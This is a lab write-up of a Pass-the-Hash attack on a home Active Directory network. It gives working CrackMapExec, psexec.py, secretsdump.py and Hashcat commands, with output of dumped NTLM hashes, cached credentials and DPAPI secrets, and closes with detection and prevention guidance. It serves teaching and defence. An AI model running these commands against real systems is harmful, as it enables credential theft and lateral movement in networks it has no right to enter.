# Pass The Hash

**Date:** May 2026 <br>
**Author:** ShahinSecLab <br>
**Category:** Lateral Movemen<br>
**Difficulty:** Easy <br>
**Tools:** CrackMapExec, PsExec.py, Hashcat

## Table of Contents

* [Introduction](#introduction)
* [Attack Flow](#attack-flow)
* [Why This Attack Works](#why-this-attack-works)
* [Lab Setup](#lab-setup)
* [Tools Used](#tools-used)
* [Prerequisites](#prerequisites)
* [Step 1 — Spraying the Network and Dumping SAM Hashes with CrackMapExec](#step-1--spraying-the-network-and-dumping-sam-hashes-with-crackmapexec)
* [Step 2 — Dumping Additional Credentials with secretsdump.py](#step-2--dumping-additional-credentials-with-secretsdump)
* [Step 3 — Saving the Hashes](#step-3--saving-the-hashes)
* [Step 4 — Cracking the Hashes with Hashcat](#step-4--cracking-the-hashes-with-hashcat)
* [Step 5 — Passing the Hash with CrackMapExec](#step-5--passing-the-hash-with-crackmapexec)
* [How Defenders Can Catch This](#how-defenders-can-catch-this)
* [How to Prevent It](#how-to-prevent-it)
* [References](#references)
* [Lessons Learned](#lessons-learned)


## Introduction

Pass-the-Hash (PtH) is a technique that allows someone to authenticate using an NTLM hash instead of the actual password. In Windows environments, passwords are stored as hashes, and NTLM authentication uses those hashes during the login process.

This means that if an NTLM hash is obtained from a compromised system, it can often be used to access other systems without knowing the user's real password. There is no need to crack the hash or recover the plaintext password first.

Pass-the-Hash has been around for a long time and is still commonly seen in Windows networks. After gaining access to one machine and obtaining credential hashes, it can be used to move to other systems where the same account has permissions, making it a popular lateral movement technique.

## Attack Flow
```
Valid Domain Credentials
                  │
                  ▼
Enumerating the Network with CrackMapExec
                  │
                  ▼
Dumping Local SAM Hashes (--sam)
                  │
                  ▼
Identifying Systems with Admin Access
                  │
                  ▼
Verifying Access with PsExec
                  │
                  ▼
Dumping Additional Credentials with secretsdump.py
                  │
                  ▼
Collecting NTLM Hashes and Secrets
                  │
                  ▼
Saving the NTLM Hashes
                  │
                  ▼
Cracking the Hashes with Hashcat
                  │
                  ▼
Reusing the NTLM Hash for Authentication
                  │
                  ▼
Authenticating to Other Systems
                  │
                  ▼
Gaining Access to the Target
                  │
                  ▼
 Moving to Other Systems
```
## Why This Attack Works

Pass-the-Hash works because Windows allows users to authenticate using NTLM hashes instead of the actual password.

When a user logs into a Windows system, the password is converted into an NTLM hash. Windows uses this hash during authentication. If an attacker gets access to this hash, they can use it to authenticate to other systems without knowing the original password.

This attack is more effective when:

- The same local administrator password is used on multiple machines.
- Users have unnecessary administrator privileges.
- NTLM authentication is enabled across the network.
- Administrators use privileged accounts on regular user machines.
- Credential protection features are not enabled.

In this lab, the attack was possible because the same password was reused on multiple systems. The NTLM hash:

## Lab Setup

| Machine  | Operating System |         Role          |    Ip         |
|----------|------------------|-----------------------|---------------|
| Attacker | Kali Linux       | Attacker machine      | `192.168.5.128` |
| Server   | Windows Server   | Domain Controller     | `192.168.5.134` |
| Victim 1 | Windows 10       | Domain joined machine | `192.168.5.135` |
| Victim 2 | Windows 10       | Domain joined machine | `192.168.5.136` |


Before starting the attack, I already had the following valid domain credentials:

- Domain: `readteambd.local`
- User: `rahimkhan`
- Pass: `Password1`

## Step 1 — Spraying the Network and Dumping SAM Hashes with CrackMapExec

I already had valid domain credentials for **rahimkhan** from an earlier step. My first goal was to find which systems these credentials could access and check whether the account had local administrator privileges.

I used **CrackMapExec** to scan the subnet and included the `--sam` option to dump local SAM hashes from any system where the account had administrative access.

```bash
crackmapexec smb 192.168.5.0/24 -u rahimkhan -d READTEAMBD.local -p Password1 --sam
```
**Flag Breakdown**

| Flag              | Description |
|---------------------------------|---------------------------------------------------------------------------|
| `smb`                            | Uses the SMB protocol to communicate with Windows hosts.                  |
| `192.168.5.0/24`                 | Target subnet. CrackMapExec will scan all hosts within this network range. |
| `-u rahimkhan`                   | Username used for authentication.                                         |
| `-d READTEAMBD.local`            | Active Directory domain associated with the user account.                 |
| `-p Password1`                   | Password for the specified user account.                                  |
| `--sam`                          | Dumps local SAM (Security Account Manager) password hashes from systems where administrative access is available. |

**Output:**

```
SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
SMB         192.168.5.135   445    VICTIM-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-1) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] Windows Server 2022 Build 20348 x64 (name:REDTEAMBD-DC) (domain:READTEAMBD.local) (signing:True) (SMBv1:False)
SMB         192.168.5.136   445    VICTIM-2         [+] READTEAMBD.local\rahimkhan:Password1 (Pwn3d!)
SMB         192.168.5.135   445    VICTIM-1         [+] READTEAMBD.local\rahimkhan:Password1 (Pwn3d!)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] READTEAMBD.local\rahimkhan:Password1 
SMB         192.168.5.136   445    VICTIM-2         [+] Dumping SAM hashes
SMB         192.168.5.135   445    VICTIM-1         [+] Dumping SAM hashes
SMB         192.168.5.135   445    VICTIM-1         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.135   445    VICTIM-1         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.135   445    VICTIM-1         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.135   445    VICTIM-1         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58de7b52b01e171824c8aeaa55fb1a89:::
SMB         192.168.5.135   445    VICTIM-1         rahim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.135   445    VICTIM-1         [+] Added 5 SAM hashes to the database
SMB         192.168.5.136   445    VICTIM-2         Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6f3ff0667b23a61adbffbe71a1e8dd8b:::
SMB         192.168.5.136   445    VICTIM-2         defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:337b1d18e8d0a8405c907048fdfbbae2:::
SMB         192.168.5.136   445    VICTIM-2         karim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.136   445    VICTIM-2         [+] Added 6 SAM hashes to the database
```

The scan showed that *rahimkhan* had local administrator access on **VICTIM-1** and **VICTIM-2**, which is indicated by (**Pwn3d!**). The account authenticated successfully to the domain controller, but it did not have local administrator privileges there.

The dumped SAM hashes also revealed something interesting. The **Administrator** account on **VICTIM-1**, the local user **rahim**, and the local user **karim** on **VICTIM-2** all shared the same NTLM hash:

```bash
64f12cddaa88057e06a81b54e73b949b
```
Since identical NTLM hashes represent identical passwords, these accounts were using the same password.

<p align="center">
  <img src="/Active-Directory/04-pass the hash/images/step1-1.png" width="600">
</p>

To confirm that the credentials had administrative access, I connected to **VICTIM-1** using PsExec.

```bash
psexec.py readteambd/rahimkhan:Password1@192.168.5.135
```
**Flag Breakdown**

| Flag  | Description |
|-----------------|---------------------------------------------------------------------------|
| `psexec.py`     | Impacket tool that uses valid credentials to get a SYSTEM shell on a remote Windows host via SMB. |
| `readteambd`    | Active Directory domain the target belongs to. |
| `rahimkhan`     | Username used for authentication.              |
| `Password1`     | Password for the specified user account.       |
| `192.168.5.135` | Target IP address to connect to.               |

**Output:**

```
[*] Found writable share ADMIN$
[*] Uploading file 8Slpmu2.exe
[*] Opening SVCManager on 192.168.5.135
[*] Starting service vJfn

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
Victim-1
```
The connection was successful, and I obtained a SYSTEM shell on **VICTIM-1**.

<p align="center">
  <img src="/Active-Directory/04-pass the hash/images/step1-2.png" width="600">
</p>

With administrative access confirmed, I moved on to dumping additional credential material from the compromised systems using `secretsdump.py`

## Step 2 — Dumping Additional Credentials with `secretsdump.py`

After confirming administrative access on **VICTIM-1**, I used secretsdump.py to collect additional credential material from the compromised systems.

```bash
secretsdump.py readteambd/rahimkhan:Password1@192.168.5.135
```

Although `CrackMapExec` had already dumped the local SAM hashes, `secretsdump.py` can extract additional information, including:

- Local SAM hashes
- Cached domain credentials
- LSA secrets
- Machine account keys
- DPAPI secrets

**VICTIM-1 Output:**

```
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x6608255fec750bd36510ab28b84600b1
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58de7b52b01e171824c8aeaa55fb1a89:::
rahim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
READTEAMBD.LOCAL/Administrator:$DCC2$10240#Administrator#e82d48bcd598cafade91e02c44001bcb
READTEAMBD.LOCAL/rahimkhan:$DCC2$10240#rahimkhan#f3ae9b5061b3126512ee3dc3d5ad6736
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
READTEAMBD\VICTIM-1$:aes256-cts-hmac-sha1-96:14e03c91b7591eeadf3b1cc00424446695535d3ccfa0a17e15bc712270a90d76
READTEAMBD\VICTIM-1$:aes128-cts-hmac-sha1-96:a29a72336c96029edac48f600795b1f0
READTEAMBD\VICTIM-1$:des-cbc-md5:d67c382016f443b9
READTEAMBD\VICTIM-1$:aad3b435b51404eeaad3b435b51404ee:a5fe1d0dc9eb932036cba4e74ff64bac:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe194f0486d5dc1ce67698f0f5ee9ac4bb2ea35ef
dpapi_userkey:0x1280472b70f87a45367400a7ae2b8b8fc127e398
[*] NL$KM 
 0000   4B 8F CA 52 BF 95 F1 83  BD 04 4D 00 F5 06 D9 A5   K..R......M.....
 0010   D7 AC C0 E8 E5 95 E9 3C  EA B7 40 AE 2E 58 3A FA   .......<..@..X:.
 0020   CB D8 30 18 5A 54 D3 22  51 11 9C 94 5D 1B DC 02   ..0.ZT."Q...]...
 0030   A4 11 1A AB C0 B3 BE A0  95 8E 40 B9 75 3D 49 A7   ..........@.u=I.
NL$KM:4b8fca52bf95f183bd044d00f506d9a5d7acc0e8e595e93ceab740ae2e583afacbd830185a54d32251119c945d1bdc02a4111aabc0b3bea0958e40b9753d49a7
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
From the output, I was able to recover the local SAM hashes again, along with cached domain credentials, machine account keys, DPAPI secrets, and the NL$KM secret. These credentials can be useful for further authentication and post-exploitation activities.

<p align="center">
  <img src="/Active-Directory/04-pass the hash/images/step2-1.png" width="600">
</p>

I repeated the same process on **VICTIM-2**.

```bash
secretsdump.py readteambd/rahimkhan:Password1@192.168.5.136
```

**VICTIM-2 Output:**
```
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x26daf3e3d4c1f8aa07b2b91228d60a55
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6f3ff0667b23a61adbffbe71a1e8dd8b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:337b1d18e8d0a8405c907048fdfbbae2:::
karim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
READTEAMBD.LOCAL/Administrator:$DCC2$10240#Administrator#e82d48bcd598cafade91e02c44001bcb
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
READTEAMBD\VICTIM-2$:aes256-cts-hmac-sha1-96:988227393fdc3358ccfab5fe9c223e465c0e6cc7a2c924c080c430f667ee0fbf
READTEAMBD\VICTIM-2$:aes128-cts-hmac-sha1-96:24c5e3a094f1ae6c51014e95e6f9e3fd
READTEAMBD\VICTIM-2$:des-cbc-md5:efc180d354075820
READTEAMBD\VICTIM-2$:aad3b435b51404eeaad3b435b51404ee:241691b698e90567f10688cbeb494357:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc9fe733ed67c2e131c76f5aae18a49435003e3b2
dpapi_userkey:0x76579e18b9cafed8ddc74b135f34617eaea84a50
[*] NL$KM 
 0000   C7 B7 B5 BD A0 D3 3E 86  62 BF FB 11 E1 89 9A B8   ......>.b.......
 0010   AA EB B5 B8 79 48 11 5F  CB EC C5 99 35 10 E8 60   ....yH._....5..`
 0020   44 27 D5 CB 0A D9 91 9A  F1 56 EF 17 23 30 69 0F   D'.......V..#0i.
 0030   DF 98 14 95 EC 51 7D 16  11 9E 12 61 6C 1C 28 CE   .....Q}....al.(.
NL$KM:c7b7b5bda0d33e8662bffb11e1899ab8aaebb5b87948115fcbecc5993510e8604427d5cb0ad9919af156ef172330690fdf981495ec517d16119e12616c1c28ce
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
The second system produced similar results, including local SAM hashes, cached credentials, machine account keys, DPAPI secrets, and the NL$KM secret.
At this point, I had collected all the credential material needed for the next stage of the attack.

<p align="center">
  <img src="/Active-Directory/04-pass the hash/images/step2-2.png" width="600">
</p>

## Step 3 — Saving the Hashes

After collecting the credential material from both systems, I saved the NTLM hashes that I wanted to crack and use later.

```bash
nano passthehash.txt
```
I copied the relevant NTLM hashes into the file and saved it for the next step.

## Step 4 — Cracking the Hashes with Hashcat

After saving the NTLM hashes, I used `Hashcat` with the `rockyou.txt` wordlist to see if any of them could be cracked.

```bash
hashcat -m 1000 passthehash.txt /usr/share/wordlists/rockyou.txt
```
The `-m 1000` option tells Hashcat that the hashes are in NTLM format.

Hashcat successfully recovered the password for the NTLM hash `64f12cddaa88057e06a81b54e73b949b`.
The results also confirmed that the following accounts were using the same password:

**Results:**

```
64f12cddaa88057e06a81b54e73b949b:Password1                
31d6cfe0d16ae931b73c59d7e0c089c0:                         
Approaching final keyspace - workload adjusted.           
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: passthehash.txt
Time.Started.....: Thu May 28 14:17:14 2026 (8 secs)
Time.Estimated...: Thu May 28 14:17:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1848.3 kH/s (0.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 2/4 (50.00%) Digests (total), 2/4 (50.00%) Digests (new)
Progress.........: 14344387/14344387 (100.00%)
Rejected.........: 0/14344387 (0.00%)
Restore.Point....: 14344387/14344387 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  laylanie -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 23%
```
The results also confirmed that the following accounts were using the same password:

- `VICTIM-1\Administrator`
- `VICTIM-1\rahim`
- `VICTIM-2\karim`

All three accounts used` Password1`.

The hash `31d6cfe0d16ae931b73c59d7e0c089c0` was not cracked because it represents a blank password. This hash belonged to the Guest and DefaultAccount accounts.

<p align="center">
  <img src="/Active-Directory/04-pass the hash/images/step4-1.png" width="600">
</p>

## Step 5 — Passing the Hash with CrackMapExec

Instead of using a password, I used the recovered NTLM hash to authenticate with the local Administrator account. CrackMapExec supports Pass-the-Hash using the `-H` option.

```bash
crackmapexec smb 192.168.5.0/24 -u administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth
```
**Flag Breakdown**

| Flag           | Description |
|----------------|---------------------------------------------------------------------------|
| `smb`                                        | Uses the SMB protocol to communicate with Windows hosts.                  |
| `192.168.5.0/24`                             | Target subnet. CrackMapExec will scan all hosts within this network range. |
| `-u administrator`                           | Username used for authentication.                                         |
| `-H 64f12cddaa88057e06a81b54e73b949b`        | NTLM hash used for pass-the-hash authentication instead of a plaintext password. |
| `--local-auth`                               | Authenticates against the local account database instead of the domain, since this is the local Administrator account. |

**Output:**

```
SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:VICTIM-2) (signing:False) (SMBv1:False)
SMB         192.168.5.135   445    VICTIM-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-1) (domain:VICTIM-1) (signing:False) (SMBv1:False)
SMB         192.168.5.136   445    VICTIM-2         [-] VICTIM-2\administrator:64f12cddaa88057e06a81b54e73b949b STATUS_LOGON_FAILURE 
SMB         192.168.5.135   445    VICTIM-1         [+] VICTIM-1\administrator:64f12cddaa88057e06a81b54e73b949b (Pwn3d!)
```

The authentication was successful on **VICTIM-1**, and CrackMapExec reported (**Pwn3d!**), confirming administrative access.

Authentication failed on **VICTIM-2** because its local **Administrator** account uses a different NTLM hash. Since the hash I supplied did not match the one stored on that system, the login was rejected.

This demonstrates how Pass-the-Hash works. If two accounts share the same NTLM hash, the hash can be reused for authentication without knowing the plaintext password. If the hashes are different, authentication fails.

<p align="center">
  <img src="/Active-Directory/04-pass the hash/images/step5-1.png" width="600">
</p>

## How Defenders Can Catch This

| Indicator                                                     | What to look for                  |
|-----------------------------------------------------------------|--------------------------------------|
| Multiple SMB authentication attempts from one host               | SMB authentication logs             |
| Local Administrator account authenticating to several systems    | Windows Security Event Logs         |
| Remote service created by PsExec                                 | Event ID 7045 (Service Installed)   |
| RemoteRegistry service started unexpectedly                      | Windows System Event Logs           |
| Credential dumping activity with `secretsdump.py`                 | EDR/AV alerts and Windows logs      |
| NTLM authentication instead of Kerberos                          | Authentication logs                 |
| Repeated failed logon attempts using the same NTLM hash          | Event ID 4625 (Failed Logon)        |
| Successful network logons from unusual hosts                     | Event ID 4624 (Logon Type 3)        |
| Lateral movement over SMB (TCP 445)                               | Network traffic monitoring          |

## How to Prevent It

Pass-the-Hash works because stolen NTLM hashes can still be reused for authentication. The goal of defense is to stop hash reuse and limit where credentials can travel.

**Disable or Reduce NTLM Usage**
- Prefer Kerberos authentication instead of NTLM
- Restrict NTLM where possible using Group Policy
- Monitor systems still using NTLM

**Enable Credential Guard**
- Isolates and protects credentials from memory extraction
- Prevents tools from accessing LSASS easily

**Use Unique Local Administrator Passwords**
- Never reuse the same local admin password across machines
- Use tools like LAPS (Local Administrator Password Solution)

**Apply Least Privilege**
- Users should not have admin rights unless required
- Separate admin accounts from normal user accounts
- Avoid logging in as Domain Admin on workstations

**Limit Lateral Movement**
- Segment the network (users, servers, DCs)
- Restrict SMB (port 445) between workstations where possible
- Block admin shares from non-admin systems

**Protect LSASS Process**
- Enable RunAsPPL (Protected Process Light)
- Prevent credential dumping from memory

**Patch and Update Systems**
- Keep Windows and domain controllers updated
- Fix known SMB and authentication vulnerabilities
                                                                               
## References

| Resource                                      | Link                                                                 |
|------------------------------------------------|----------------------------------------------------------------------|
| MITRE ATT&CK — Pass-the-Hash (T1550.002)       | https://attack.mitre.org/techniques/T1550/002/                      |
| Microsoft — NTLM Authentication Overview       | https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview |
| Microsoft — Credential Guard                   | https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/ |
| Microsoft — Local Administrator Password Solution (LAPS) | https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview |

## Lessons Learned

- Pass-the-Hash attacks do not require the attacker to know the plaintext password.
- NTLM hashes can be reused directly for authentication and lateral movement.
- Reusing local administrator passwords across multiple systems increases security risk.
- A single compromised machine can provide access to additional systems in the environment.
- Kerberos authentication, least privilege, and proper credential management significantly reduce the risk of lateral movement.
- Monitoring authentication logs and abnormal SMB activity is critical for detecting Pass-the-Hash attacks.